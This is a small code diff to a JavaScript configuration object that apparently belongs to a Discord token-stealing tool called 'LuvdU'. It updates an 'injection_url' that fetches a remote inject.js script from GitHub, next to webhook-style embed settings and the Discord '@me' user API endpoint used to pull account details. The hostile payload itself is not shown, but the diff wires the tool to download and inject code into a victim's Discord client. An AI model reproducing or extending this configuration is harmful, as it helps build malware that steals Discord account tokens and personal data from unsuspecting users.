@@ -14,7 +14,7 @@ const config = {
   embed_name: 'LuvdU',
   embed_icon: 'https://i.imgur.com/444NM0M.jpg'.replace(/ /g, '%20'),
   embed_color: 2895667,
-  injection_url: 'https://raw.githubusercontent.com/XoQ2988/injection/index.js',
+  injection_url: 'https://raw.githubusercontent.com/XoQ2988/LuvdU/master/inject.js',
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
